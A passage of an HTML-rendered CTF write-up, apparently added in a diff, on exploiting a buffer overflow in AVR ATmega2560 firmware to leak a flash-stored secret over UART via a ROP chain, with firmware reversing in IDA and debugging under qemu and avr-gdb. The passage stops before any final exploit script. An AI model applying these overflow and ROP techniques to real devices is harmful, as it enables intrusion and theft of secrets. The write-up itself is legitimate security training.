+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;memset&lt;/span&gt;(buff, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(buff));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    buff[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;uart_get&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(buff[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        buff[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;              &lt;span style=&#34;color:#75715e&#34;&gt;// only breaks on &amp;#39;\n&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;;                &lt;span style=&#34;color:#75715e&#34;&gt;// i can go bigger than sizeof(buff)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;h3 id=&#34;plan&#34;&gt;Plan&lt;/h3&gt;
+&lt;p&gt;Now that we are aware of a buffer overflow vulnerability, we need to think of a way to exploit it.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s break down what we know:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;passwd_check&lt;/code&gt; function is vulnerable to buffer overflow when retrieving user input
+&lt;ul&gt;
+&lt;li&gt;the checking of the password cannot be tempered as the overwritten variable &lt;code&gt;check&lt;/code&gt; is set after the overflow happens (overwritting our changes)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;the &lt;code&gt;secret&lt;/code&gt; content is stored in &lt;code&gt;FLASH&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;the only interface between attacker and the board is &lt;code&gt;UART&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Our final goal is to leak the stored secret. We would like to exploit the &lt;code&gt;passwd_check&lt;/code&gt; function, make the program read the secret and display it on the UART interface.&lt;/p&gt;
+&lt;p&gt;This requires to create a ROPchain that will retrieve the secret memory location with &lt;code&gt;get_secret_address&lt;/code&gt;, and then use &lt;code&gt;pgm_read_byte&lt;/code&gt; and &lt;code&gt;uart_putc&lt;/code&gt; to display each byte of the secret. The involved ROPchain will not be so simple as we need to loop over each characters of the secret (incrementing the address and stopping when current char is &lt;code&gt;&#39;\0&#39;&lt;/code&gt;)&lt;/p&gt;
+&lt;p&gt;Luckily enough, the &lt;code&gt;uart.c&lt;/code&gt; interface has a &lt;code&gt;uart_puts_p&lt;/code&gt; function which already achieve this goal:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;uart_puts_p&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;str) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pgm_read_byte&lt;/span&gt;(str) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x00&lt;/span&gt;) { 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;uart_putc&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pgm_read_byte&lt;/span&gt;(str&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This really simplify the exploit as we only need to retrieve the secret address and call this function.&lt;/p&gt;
+&lt;p&gt;Now that we have our plan ready to exploit the firmware, we need to look at the compiled code with &lt;strong&gt;IDA&lt;/strong&gt; or &lt;strong&gt;ghidra&lt;/strong&gt; in order to craft the exploit script.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;I first choose to use ghidra because it has decompilers for AVR ATmega2560. I used it to better map correspondance between source and executable functions, but I finally ended up switching back to IDA and just reading assembly code, because decompiled code was not so clear.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;avr-internals&#34;&gt;AVR Internals&lt;/h3&gt;
+&lt;p&gt;As I didn&amp;rsquo;t know very much yet about AVR architectures, I used &lt;a href=&#34;https://hackaday.io/course/176685-avr-architecture-assembly-reverse-engineering&#34;&gt;this ressource&lt;/a&gt; to learn AVR, and looked at the &lt;a href=&#34;https://ww1.microchip.com/downloads/en/DeviceDoc/AVR-Instruction-Set-Manual-DS40002198A.pdf&#34;&gt;instruction set manual&lt;/a&gt; and &lt;a href=&#34;https://ww1.microchip.com/downloads/aemDocuments/documents/OTH/ProductDocuments/DataSheets/ATmega640-1280-1281-2560-2561-Datasheet-DS40002211A.pdf&#34;&gt;ATmega2560 datasheet&lt;/a&gt; when needed. There is also interesting material in &lt;a href=&#34;https://gcc.gnu.org/wiki/avr-gcc#Calling_Convention&#34;&gt;avr-gcc documentation&lt;/a&gt; about calling convention.&lt;/p&gt;
+&lt;p&gt;What&amp;rsquo;s important to care about in AVR architecture:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Harvard architecture (CODE and DATA segments are separated, respectively in FLASH and RAM)&lt;/li&gt;
+&lt;li&gt;CPU registers are located in first bytes of the RAM&lt;/li&gt;
+&lt;li&gt;instructions are fixed size (16 or 32 bits)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;SP&lt;/code&gt; and &lt;code&gt;FP&lt;/code&gt; are &lt;strong&gt;not aligned&lt;/strong&gt; (1-byte alignement)
+&lt;ul&gt;
+&lt;li&gt;a &lt;code&gt;PUSH&lt;/code&gt; instruction pushes 1 byte&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;return address is 2 or 3 bytes wide&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;could be empty for tail-called functions (leaf functions)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;memory locations and addresses are not always the same&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;the address used in &lt;code&gt;CALL&lt;/code&gt;, or &lt;code&gt;JMP&lt;/code&gt;, is: &lt;code&gt;mem_ea / 2&lt;/code&gt; (which corresponds to the instruction offset)&lt;/li&gt;
+&lt;li&gt;if you look at 2 consecutive 16-bits instructions in IDA or ghidra, you will see the address is only incremented by 1 (but actual memory location of the second instruction is 2 bytes far from first one)
+&lt;img alt=&#34;consecutive instructions&#34; src=&#34;//localhost:1313/img/pwn-hackropole_pwnduino/consecutive-insns.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;radare2&lt;/strong&gt; is displaying memory location instead of instruction offsets (but the instruction offsets are still used by call/jmp instructions)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;firmware-analysis&#34;&gt;Firmware Analysis&lt;/h3&gt;
+&lt;h4 id=&#34;reconstructing-the-firmware&#34;&gt;Reconstructing the firmware&lt;/h4&gt;
+&lt;p&gt;Let&amp;rsquo;s say we don&amp;rsquo;t have access to the source code, but only to the firmware binary. We could just load the binary into IDA and start reversing, but only the ROM would be recognized and loaded.&lt;/p&gt;
+&lt;p&gt;In order to fix this, we can spot the &lt;code&gt;__do_copy_data&lt;/code&gt; code (which copies data from FLASH to RAM at startup) and reconstruct the RAM, before loading it in IDA.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s open the &lt;code&gt;firmware_debug.bin&lt;/code&gt; file in IDA. Select AVR architecture and you will be prompt to select an AVR configuration file which defines memory layout, registers addresses, etc&amp;hellip; The &lt;code&gt;ATmega640&lt;/code&gt; shares same layout as our &lt;code&gt;ATmega2560&lt;/code&gt; board except it has a smaller FLASH memory (64KB instead of 256KB). I modified the IDA AVR config file (&lt;code&gt;&amp;lt;idapro-dir&amp;gt;/cfg/avr.cfg&lt;/code&gt;) to duplicate the entry and modify RAM size, you can find the modified file &lt;a href=&#34;//localhost:1313/ida-avr.cfg&#34;&gt;here&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The first instruction at &lt;code&gt;0x0&lt;/code&gt; should be a jump to address &lt;code&gt;0x86&lt;/code&gt; (the &lt;code&gt;__RESET&lt;/code&gt; handler). In this routine, we can find &lt;code&gt;__do_copy_data&lt;/code&gt; at address &lt;code&gt;0x8e&lt;/code&gt; (not labeled by default, click the current instruction and press &lt;code&gt;N&lt;/code&gt; for renaming). Just after the loop, the reset handler call the &lt;code&gt;main&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;The &lt;code&gt;__do_copy_data&lt;/code&gt; code retrieves the RAM start address (specified in &lt;a href=&#34;https://ww1.microchip.com/downloads/aemDocuments/documents/OTH/ProductDocuments/DataSheets/ATmega640-1280-1281-2560-2561-Datasheet-DS40002211A.pdf&#34;&gt;board datasheet&lt;/a&gt;) and FLASH address of data to copy. You can notice RAM address is copied into &lt;code&gt;X&lt;/code&gt; register when FLASH address is written to &lt;code&gt;Z&lt;/code&gt; register. Then it uses these pointers to set RAM memory with the &lt;code&gt;ELPM&lt;/code&gt; instruction until it reaches the end of RAM data in FLASH.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The &lt;code&gt;LPM&lt;/code&gt; and &lt;code&gt;ELPM&lt;/code&gt; instructions are used to access FLASH memory data.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img alt=&#34;RESET handler code&#34; src=&#34;//localhost:1313/img/pwn-hackropole_pwnduino/reset_handler.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can see that:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;RAM start address is &lt;code&gt;0x200&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;RAM data is located at &lt;code&gt;0x4BA&lt;/code&gt; in FLASH (meaning we need to skip 1210 bytes in firmware file)&lt;/li&gt;
+&lt;li&gt;RAM data in FLASH is 148 bytes long (&lt;code&gt;0x94&lt;/code&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Thus, we can use following commands to reconstruct the RAM:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dd &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;firmware_debug.bin of&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/tmp/RAM.bin skip&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1210&lt;/span&gt; count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;148&lt;/span&gt; bs&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dd &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/dev/zero of&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/tmp/RAM.bin seek&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;148&lt;/span&gt; count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8043&lt;/span&gt; bs&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then verify RAM was correctly created:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ xxd /tmp/RAM.bin | head -n10
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000000: 3d3d 3d20 &lt;span style=&#34;color:#ae81ff&#34;&gt;5765&lt;/span&gt; 6c63 6f6d &lt;span style=&#34;color:#ae81ff&#34;&gt;6521&lt;/span&gt; 0d0a 0050  &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; Welcome!...P
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000010: 6c65 &lt;span style=&#34;color:#ae81ff&#34;&gt;6173&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6520&lt;/span&gt; 656e &lt;span style=&#34;color:#ae81ff&#34;&gt;7465&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7220&lt;/span&gt; 796f &lt;span style=&#34;color:#ae81ff&#34;&gt;7572&lt;/span&gt;  lease enter your
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000020: &lt;span style=&#34;color:#ae81ff&#34;&gt;2070&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6173&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7370&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6872&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6173&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6520&lt;/span&gt; 746f &lt;span style=&#34;color:#ae81ff&#34;&gt;2063&lt;/span&gt;   passphrase to c
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000030: 6f6d &lt;span style=&#34;color:#ae81ff&#34;&gt;7075&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7465&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2043&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5243&lt;/span&gt; 3a0d 0a00 4f4b  ompute CRC:...OK
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000040: &lt;span style=&#34;color:#ae81ff&#34;&gt;2120&lt;/span&gt; 436f 6d70 &lt;span style=&#34;color:#ae81ff&#34;&gt;7574&lt;/span&gt; 696e &lt;span style=&#34;color:#ae81ff&#34;&gt;6720&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7468&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6520&lt;/span&gt;  ! Computing the 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000050: &lt;span style=&#34;color:#ae81ff&#34;&gt;7365&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6372&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6574&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2043&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5243&lt;/span&gt; 0d0a &lt;span style=&#34;color:#ae81ff&#34;&gt;0057&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7269&lt;/span&gt;  secret CRC...Wri
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000060: &lt;span style=&#34;color:#ae81ff&#34;&gt;7469&lt;/span&gt; 6e67 &lt;span style=&#34;color:#ae81ff&#34;&gt;2043&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5243&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2074&lt;/span&gt; 6f20 &lt;span style=&#34;color:#ae81ff&#34;&gt;4545&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5052&lt;/span&gt;  ting CRC to EEPR
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000070: 4f4d 202e 2e2e 0d0a 004b 4f20 3a2d &lt;span style=&#34;color:#ae81ff&#34;&gt;2820&lt;/span&gt;  OM ......KO :-&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000080: &lt;span style=&#34;color:#ae81ff&#34;&gt;4261&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6420&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7061&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7373&lt;/span&gt; 776f &lt;span style=&#34;color:#ae81ff&#34;&gt;7264&lt;/span&gt; 202e 2e2e  Bad password ...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000090: 0d0a &lt;span style=&#34;color:#ae81ff&#34;&gt;0000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0000&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0000&lt;/span&gt;  ................
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can finally load the RAM file (&lt;code&gt;File-&amp;gt;Load file-&amp;gt;Additional binary file&lt;/code&gt;). Choose the right options when adding the segment:
+&lt;img alt=&#34;additional binary file prompt&#34; src=&#34;//localhost:1313/img/pwn-hackropole_pwnduino/create-RAM.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Then modify the created segment in &lt;code&gt;View-&amp;gt;Open subviews-&amp;gt;Segments&lt;/code&gt; and add the extra space for registers before RAM content (also change segment class and optionally the segment name).
+&lt;img alt=&#34;extend RAM with regs&#34; src=&#34;//localhost:1313/img/pwn-hackropole_pwnduino/modif-RAM.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Good job ! Now we are able to look at the resolved address in RAM. Let&amp;rsquo;s confirm it. Go to the &lt;code&gt;main&lt;/code&gt; function and locate the first call to &lt;code&gt;uart_puts&lt;/code&gt; (address &lt;code&gt;0x226&lt;/code&gt;). You can see setup the arguments in &lt;code&gt;r24:r25&lt;/code&gt; which holds the RAM address of the string to display (&lt;code&gt;0x0200&lt;/code&gt;). Jump to this location by pressing &lt;code&gt;G&lt;/code&gt; and entering &lt;code&gt;RAM:0x200&lt;/code&gt;, you should see the string &lt;code&gt;&amp;quot;=== Welcome!&amp;quot;&lt;/code&gt; (eventually press &lt;code&gt;A&lt;/code&gt; on the address to convert data to string)&lt;/p&gt;
+&lt;h4 id=&#34;reversing&#34;&gt;Reversing&lt;/h4&gt;
+&lt;p&gt;You can find &lt;a href=&#34;//localhost:1313/firmware_debug.bin.i64.tgz&#34;&gt;here&lt;/a&gt; the IDA database of the firmware, I have already identified and renamed all the functions, but you can also compile the &lt;code&gt;elf&lt;/code&gt; firmware binary from the &lt;code&gt;public&lt;/code&gt; dir, and load this one into IDA (it will already have all functions renamed and memory layout correctly mapped)&lt;/p&gt;
+&lt;p&gt;We now want to know exactly how many bytes the &lt;code&gt;passwd_check&lt;/code&gt; function allocates and what is the stack layout. If we look at the function prologue, we see it pushes previous FP and allocates 24 bytes, and then it calls &lt;code&gt;memset(buff, 0, sizeof(buff))&lt;/code&gt;. We can see here that the &lt;code&gt;buff&lt;/code&gt; variable is located at &lt;code&gt;Y+8&lt;/code&gt;, but we can see in avr-gcc documentation that stack top (they use bottom term instead) is located at &lt;code&gt;Y+1&lt;/code&gt;. Thus the buffer is located at &lt;code&gt;SP+7&lt;/code&gt;, and is 19 bytes from the return address ((24+2)-7).&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;passwd_check function prologue&#34; src=&#34;//localhost:1313/img/pwn-hackropole_pwnduino/passwd_check-prologue.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now we need to know how many bytes is the return address. As I didn&amp;rsquo;t achieve to find this information on internet, I ended up determining this using dynamic analysis. We will setup a debugging environment with qemu.&lt;/p&gt;
+&lt;p&gt;Install &lt;code&gt;avr-gcc&lt;/code&gt;, &lt;code&gt;avr-libc&lt;/code&gt;, &lt;code&gt;avr-gdb&lt;/code&gt; and &lt;code&gt;qemu-system-avr&lt;/code&gt;, then compile the firmware elf and run:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;qemu-system-avr -M mega2560 -bios firmware_debug.elf -nographic -serial tcp::1337,server&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;on,wait&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;off -s -S
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I found the command on the internet. From what I understood with documentation, it emulates the firmware, redirect serial I/O to tcp port &lt;code&gt;1337&lt;/code&gt;, starts gdb server on port &lt;code&gt;1234&lt;/code&gt; (&lt;code&gt;-s&lt;/code&gt;) and halt the CPU on startup (&lt;code&gt;-S&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;We can now debug the firmware with:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ avr-gdb -q ./firmware_debug.elf 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; target remote :1234
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Remote debugging using :1234
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;warning: Target-supplied registers are not supported by the current architecture
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x00000000 in __vectors &lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Add a breakpoint on &lt;code&gt;passwd_check&lt;/code&gt; stack cleanup epilogue (disas the function in gdb and locate the &lt;code&gt;cli&lt;/code&gt; instruction at the end), then continue execution:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; b *0x00000428
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Breakpoint &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; at 0x800428
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;gdb&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; c
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s check the stack to see the return address.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;^C
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Program received signal SIGINT, Interrupt.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0x000001fa in uart_get &lt;span style=&#34;color:#f92672&#34;&gt;()&lt;/span&gt; at uart.c:27
